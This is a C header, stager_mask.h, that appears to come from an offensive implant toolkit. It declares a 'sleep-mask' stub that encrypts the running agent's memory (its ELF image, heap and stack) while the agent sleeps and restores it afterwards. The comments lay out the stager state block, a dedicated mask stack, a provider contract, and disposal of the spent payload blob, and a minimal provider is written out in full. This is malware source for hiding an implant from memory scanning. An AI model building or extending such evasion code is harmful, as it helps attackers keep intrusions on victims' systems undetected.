#ifndef STAGER_MASK_H
#define STAGER_MASK_H

#include <stddef.h>
#include <stdint.h>

#include "stager_iface.h"

/*
 * Sleep-mask stub for the stager.
 *
 * The mask code lives in the stager mapping, not in the agent image, so it can
 * keep running while the agent image is XORed. stager_mask_publish() places
 * the entry point in the GS state block installed by the stager, and the agent
 * reads it at startup. The agent must have stopped or joined every other
 * thread first: this function masks in place and does not suspend the caller.
 *
 * The agent passes an address inside its own mapping (a probe, currently
 * informational) and the sleep duration. The wrapper switches to the stager's
 * dedicated mask stack and calls the provider. The default provider encrypts
 * agent-owned memory (anonymous ELF images, [heap], [stack]), sleeps, restores
 * it and returns. Runtime TLS/libc/stager mappings and the stub's state/stack
 * remain usable while the agent is masked.
 */
typedef int (*stager_mask_fn)(unsigned seconds, uintptr_t probe);

/* Publish the mask entry point in the stager state block (mask.c). */
void stager_mask_publish(void);

/*
 * Run the provider on the stager's dedicated stack. `keep_start..keep_end` is
 * the state+stack mapping that must stay untouched. Exported for the mask
 * test, which supplies its own stack; production callers use
 * stager_mask_sleep().
 */
int stager_mask_run_on_stack(unsigned seconds, uintptr_t probe, void *stack_top,
                             uintptr_t keep_start, uintptr_t keep_end);

/*
 * Provider contract (mask_<name>.c, selected with MASK=<name>):
 * mask the chosen agent-owned ranges except `keep_start..keep_end`, sleep, and
 * restore them. Runs on the dedicated stub stack, so it may mask the agent's
 * stack. The provider is free to mmap its own scratch. 0 on success. The common
 * wrapper in mask.c discards the spent payload blob first.
 *
 * A minimal provider can simply sleep:
 *
 *   int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
 *                                  uintptr_t keep_start, uintptr_t keep_end) {
 *     (void)probe; (void)keep_start; (void)keep_end;
 *     struct { long sec, nsec; } ts = {(long)seconds, 0};
 *     while (syscall2(SYS_nanosleep, (long)&ts, (long)&ts) == -4) {}
 *     return 0;
 *   }
 */
int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
                               uintptr_t keep_start, uintptr_t keep_end);

#endif /* STAGER_MASK_H */
